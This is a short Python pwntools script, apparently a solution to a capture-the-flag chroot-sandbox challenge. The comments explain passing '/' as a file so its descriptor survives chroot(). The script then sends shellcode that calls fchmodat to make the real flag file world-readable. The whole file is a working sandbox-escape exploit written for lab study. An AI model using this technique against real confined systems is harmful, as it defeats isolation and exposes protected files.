from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# The challenge binary takes a file to read, but the trick is everything is a
# file, even directories. Therefore, I give it / as the directory to open and
# after chroot(), that fd will still be available. Now I use fchmodat() giving
# it the fd and ask it to apply 777 permissions to 'flag' relative to the opened
# fd. This will make '/flag' refer to the actual flag rather than the flag
# inside the chroot()ed environment.

assembly = str()
assembly += shellcraft.fchmodat(3, "flag", 0o0777)
assembly += shellcraft.exit(0)

# the hostname will always be the same as challenge binary

challenge_binary = os.getenv('HOSTNAME')
with process([f"/challenge/{challenge_binary}", "/"]) as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
